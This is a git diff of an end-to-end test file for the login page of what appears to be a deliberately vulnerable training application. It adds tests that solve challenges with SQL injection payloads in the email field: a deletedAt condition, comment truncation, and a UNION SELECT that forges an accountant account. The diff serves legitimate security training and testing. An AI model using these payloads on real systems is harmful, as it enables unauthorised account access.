@@ -95,10 +95,10 @@ describe('/#/login', () => {
       loginButton.click()
     })
 
-    protractor.expect.challengeSolved({ challenge: 'DLP Failure Tier 2' })
+    protractor.expect.challengeSolved({ challenge: 'Leaked Access Logs' })
   })
 
-  describe('challenge "twoFactorAuth"', () => {
+  describe('challenge "twoFactorAuthUnsafeSecretStorage"', () => {
     const EC = protractor.ExpectedConditions
     let twoFactorTokenInput
     let twoFactorSubmitButton
@@ -125,9 +125,9 @@ describe('/#/login', () => {
   })
 
   describe('challenge "oauthUserPassword"', () => {
-    it('should be able to log in as bjoern.kimminich@googlemail.com with base64-encoded email as password', () => {
-      email.sendKeys('bjoern.kimminich@googlemail.com')
-      password.sendKeys('bW9jLmxpYW1lbGdvb2dAaGNpbmltbWlrLm5yZW9qYg==')
+    it('should be able to log in as bjoern.kimminich@gmail.com with base64-encoded email as password', () => {
+      email.sendKeys('bjoern.kimminich@gmail.com')
+      password.sendKeys('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')
       loginButton.click()
     })
 
@@ -150,5 +150,31 @@ describe('/#/login', () => {
     })
 
     protractor.expect.challengeSolved({ challenge: 'Login CISO' })
+  })
+
+  describe('challenge "ghostLogin"', () => {
+    it('should be able to log in as chris.pike@juice-sh.op by using `\' or deletedAt IS NOT NULL --`', () => {
+      email.sendKeys('\' or deletedAt IS NOT NULL--')
+      password.sendKeys('a')
+      loginButton.click()
+    })
+
+    it('should be able to log in as chris.pike@juice-sh.op by using `chris.pike@juice-sh.op\' --`', () => {
+      email.sendKeys('chris.pike@' + config.get('application.domain') + '\'--')
+      password.sendKeys('a')
+      loginButton.click()
+    })
+
+    protractor.expect.challengeSolved({ challenge: 'GDPR Data Erasure' })
+  })
+
+  describe('challenge "ephemeralAccountant"', () => {
+    it('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', () => {
+      email.sendKeys('\' UNION SELECT * FROM (SELECT 15 as \'id\', \'\' as \'username\', \'acc0unt4nt@juice-sh.op\' as \'email\', \'12345\' as \'password\', \'accounting\' as \'role\', \'1.2.3.4\' as \'lastLoginIp\' , \'default.svg\' as \'profileImage\', \'\' as \'totpSecret\', 1 as \'isActive\', \'1999-08-16 14:14:41.644 +00:00\' as \'createdAt\', \'1999-08-16 14:33:41.930 +00:00\' as \'updatedAt\', null as \'deletedAt\')--')
+      password.sendKeys('a')
+      loginButton.click()
+    })
+
+    protractor.expect.challengeSolved({ challenge: 'Ephemeral Accountant' })
   })
 })
